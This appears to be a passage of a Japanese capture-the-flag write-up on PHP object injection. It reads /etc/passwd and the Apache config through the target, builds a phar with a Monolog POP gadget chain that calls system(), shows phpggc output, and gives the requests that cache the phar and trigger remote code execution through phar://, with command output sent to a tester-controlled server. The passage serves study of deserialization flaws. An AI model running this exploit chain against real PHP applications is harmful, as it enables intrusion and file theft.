uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
orange:x:1001:1001:,,,:/home/orange:/bin/bash
```
以下で`000-default.conf`を読みだしてWebrootを確認すると`/var/www/html`であることがわかる。  
```txt
POST http://13.230.134.135/?url=http://IP&data[test]=@/etc/apache2/sites-enabled/000-default.conf
```
```txt
<VirtualHost *:80>
	...

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	...
</VirtualHost>
```
このWebサイトの機能として、アクセスした先のbodyの内容を`body.cache`に格納してくれるので、`phar`の内容を書き込んで`phar:///var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(URL)/body.cache`として読み込めば`unserialize`されてRCEできる！  
コマンドの実行結果は`?url=`で指定するIPに送信できる！  
したがって、攻撃者の用意したサーバー上に`exploit.phar`を用意してそこにアクセスさせれば、`/var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/exploit.phar)/body.cache`に`exploit.phar`の内容が書き込まれて、それを`phar://`で読み込んでRCEする！  
pharには有名はMonologのPOPガジェットが使えるらしい。  
これを実行するいは`/etc/php/7.2/cli/php.ini`で`;phar.readonly = On`を`phar.readonly = Off`にする必要がある。`/etc/php/7.2/apache2/php.ini`の方じゃないので注意。  
これを`$php make-explot-phar.php`で実行する。  
```php
<?php

namespace Monolog\Handler
{
    class SyslogUdpHandler
    {
        protected $socket;
        function __construct($x)
        {
            $this->socket = $x;
        }
    }
    class BufferHandler
    {
        protected $handler;
        protected $bufferSize = -1;
        protected $buffer;
        # ($record['level'] < $this->level) == false
        protected $level = null;
        protected $initialized = true;
        # ($this->bufferLimit > 0 && $this->bufferSize === $this->bufferLimit) == false
        protected $bufferLimit = -1;
        protected $processors;
        function __construct($methods, $command)
        {
            $this->processors = $methods;
            $this->buffer = [$command];
            $this->handler = clone $this;
        }
    }
}

namespace{
    $cmd = "ls -alt";

    $obj = new \Monolog\Handler\SyslogUdpHandler(
        new \Monolog\Handler\BufferHandler(
            ['current', 'system'],
            [$cmd, 'level' => null]
        )
    );

    $phar = new Phar('exploit.phar');
    $phar->startBuffering();
    $phar->addFromString('test', 'test');
    $phar->setStub('<?php __HALT_COMPILER(); ? >');
    $phar->setMetadata($obj);
    $phar->stopBuffering();

}
```
作成された`exploit.phar`は以下の通り。  
```txt
$ cat exploit.phar
<?php __HALT_COMPILER(); ?>
pO:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";N;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:7:"ls -alt";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:7:"ls -alt";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}test;a`~ؤtestX
j{>ңLە"GBMB
```
ちなみにPHPGCCのコマンドを使って作成した場合は以下の通りとなった。  
```txt
$ ./phpggc -p phar -o exploit-monolog1.phar monolog/rce1 system id
$ cat exploit-monolog1.phar
<?php __HALT_COMPILER(); ?>
fO:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";N;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}dummye`~ؤtest.txte`~ؤtesttest+eE㦶#h)z'GBMB
```
- **payload**  
まず以下でexplot.pharの内容を`/var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/exploit.phar)/body.cache`に書き込む  
```txt
GET http://13.230.134.135/?url=http://IP/exploit.phar
```
次に`phar://`で読み込んでRCEする。実行結果は`?url=`に送信される。  
```txt
POST http://13.230.134.135/?url=http://IP&data[test]=@phar:///var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/exploit.phar)/body.cache
```
```txt
total 104
drwxr-xr-x  26 root root  1000 Oct 21 11:08 run
drwxrwxrwt   2 root root  4096 Oct 21 06:25 tmp
-rwsr-sr-x   1 root root  8568 Oct 18 19:53 read_flag
drwxr-xr-x  23 root root  4096 Oct 18 19:53 .
drwxr-xr-x  23 root root  4096 Oct 18 19:53 ..
drwx------   5 root root  4096 Oct 18 17:12 root
drwxr-xr-x  90 root root  4096 Oct 18 11:23 etc
dr-xr-xr-x  13 root root     0 Oct 16 07:57 sys
-r--------   1 root root    54 Oct 15 19:49 flag
drwxr-xr-x   4 root root  4096 Oct 15 19:41 home
drwxr-xr-x   3 root root  4096 Oct  9 06:07 boot
lrwxrwxrwx   1 root root    31 Oct  9 06:07 initrd.img -> boot/initrd.img-4.15.0-1023-aws
lrwxrwxrwx   1 root root    28 Oct  9 06:07 vmlinuz -> boot/vmlinuz-4.15.0-1023-aws
drwxr-xr-x   2 root root  4096 Oct  9 06:07 sbin
lrwxrwxrwx   1 root root    14 Oct  8 17:14 www -> /var/www/html/
drwxr-xr-x  14 root root  4096 Oct  8 17:13 var
drwxr-xr-x   5 root root  4096 Oct  8 17:06 snap
drwxr-xr-x  15 root root  2980 Oct  8 17:06 dev
dr-xr-xr-x 136 root root     0 Oct  8 17:06 proc
lrwxrwxrwx   1 root root    31 Sep 12 16:16 initrd.img.old -> boot/initrd.img-4.15.0-1021-aws
lrwxrwxrwx   1 root root    28 Sep 12 16:16 vmlinuz.old -> boot/vmlinuz-4.15.0-1021-aws
drwxr-xr-x  20 root root  4096 Sep 12 16:16 lib
drwx------   2 root root 16384 Sep 12 16:10 lost+found
drwxr-xr-x   2 root root  4096 Sep 12 15:59 bin
drwxr-xr-x   2 root root  4096 Sep 12 15:56 lib64
drwxr-xr-x  10 root root  4096 Sep 12 15:55 usr
drwxr-xr-x   2 root root  4096 Sep 12 15:55 media
drwxr-xr-x   2 root root  4096 Sep 12 15:55 opt
drwxr-xr-x   2 root root  4096 Sep 12 15:55 mnt
drwxr-xr-x   2 root root  4096 Sep 12 15:55 srv
```
##
- **entrypoint**  
- **payload**  
##
- **entrypoint**  
- **payload**  
##
- **entrypoint**  
- **payload**  

# 参考
https://securitycafe.ro/2015/01/05/understanding-php-object-injection/   
基本的な説明。わかりやすい。   
https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/   
具体例がたくさん。よさげ。   
https://hackerone.com/reports/407552   
Vanilla Forumのpop chainのガジェット。   
https://vickieli.medium.com/diving-into-unserialize-pop-chains-35bc1141b69a   
pop chainの簡単な例。   
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md   
簡単な例と参考文献がある。   
https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection   
OWASP ZAPのわかりやすい説明。   
https://github.com/ambionics/phpggc   
PHPでの発見済みのオガジェットを簡単に作成できる。ysoserial的な。   
